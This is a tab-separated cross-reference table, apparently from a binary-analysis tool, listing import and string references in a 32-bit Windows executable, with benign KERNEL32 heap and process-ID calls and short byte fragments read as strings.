reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x401000	0x40d054	import	0x401000	KERNEL32.dll.GetCurrentProcessId
0x401020	0x40d06c	import	0x401000	KERNEL32.dll.HeapAlloc
0x4010a8	0x40d054	import	0x401070	KERNEL32.dll.GetCurrentProcessId
0x4010de	0x40d068	import	0x401070	KERNEL32.dll.HeapFree
0x4010fb	0x40d054	import	0x401070	KERNEL32.dll.GetCurrentProcessId
0x40112d	0x40d068	import	0x401070	KERNEL32.dll.HeapFree
0x4011c6	0x40d054	import	0x401140	KERNEL32.dll.GetCurrentProcessId
0x4011fd	0x40d068	import	0x401140	KERNEL32.dll.HeapFree
0x4017da	0x4017e3	string	0x401790	v\n_^]
0x40189b	0x4018a3	string	0x401800	+ƉD$$ blocks=Basic Latin,Latin Extended-B
0x401955	0x401980	string	0x401800	VQUU
0x401973	0x401980	string	0x401800	VQUU
0x401976	0x401980	string	0x401800	VQUU
0x40197b	0x401980	string	0x401800	VQUU
0x401a54	0x401790	string	0x401800	SUVW
0x401a7f	0x401790	string	0x401800	SUVW
0x401ea4	0x401ee6	string	0x401e10	_^][
0x401f82	0x401fc6	string	0x401ef0	_^][
0x4020de	0x4020f1	string	0x4020d0	3\vT$
0x4020e2	0x4020f1	string	0x4020d0	3\vT$
0x40210a	0x40214a	string	0x4020d0	_^]YÍP blocks=Basic Latin,Latin-1 Supplement
0x402139	0x40214a	string	0x4020d0	_^]YÍP blocks=Basic Latin,Latin-1 Supplement
0x4021fd	0x40d068	import	0x402180	KERNEL32.dll.HeapFree
0x402226	0x40d054	import	0x402180	KERNEL32.dll.GetCurrentProcessId
0x402268	0x4022bb	string	0x402180	_^]3
0x402288	0x40d054	import	0x402180	KERNEL32.dll.GetCurrentProcessId
0x402294	0x4022bb	string	0x402180	_^]3
0x4022a1	0x4022bb	string	0x402180	_^]3
0x402315	0x402180	string	0x4022d0	SUVW
0x40231f	0x402382	string	0x4022d0	_^]3
0x402346	0x40d054	import	0x4022d0	KERNEL32.dll.GetCurrentProcessId
0x402352	0x402382	string	0x4022d0	_^]3
0x40235f	0x402382	string	0x4022d0	_^]3
0x40237c	0x40d068	import	0x4022d0	KERNEL32.dll.HeapFree
0x40250f	0x40d068	import	0x402390	KERNEL32.dll.HeapFree
0x402538	0x40d054	import	0x402390	KERNEL32.dll.GetCurrentProcessId
0x402598	0x40d054	import	0x402390	KERNEL32.dll.GetCurrentProcessId
0x4025d9	0x40262a	string	0x402390	_^]3
0x4025f6	0x40d054	import	0x402390	KERNEL32.dll.GetCurrentProcessId
0x402602	0x40262a	string	0x402390	_^]3
0x40260f	0x40262a	string	0x402390	_^]3
0x4026e6	0x402180	string	0x402640	SUVW
0x402a9d	0x40d068	import	0x402640	KERNEL32.dll.HeapFree
0x402aca	0x40d054	import	0x402640	KERNEL32.dll.GetCurrentProcessId
0x402b24	0x40d054	import	0x402640	KERNEL32.dll.GetCurrentProcessId
0x402b82	0x40d054	import	0x402640	KERNEL32.dll.GetCurrentProcessId
0x402bda	0x40d054	import	0x402640	KERNEL32.dll.GetCurrentProcessId
0x402c1d	0x402c93	string	0x402640	_^]3
0x402c4b	0x40d054	import	0x402640	KERNEL32.dll.GetCurrentProcessId
0x402c80	0x40d068	import	0x402640	KERNEL32.dll.HeapFree
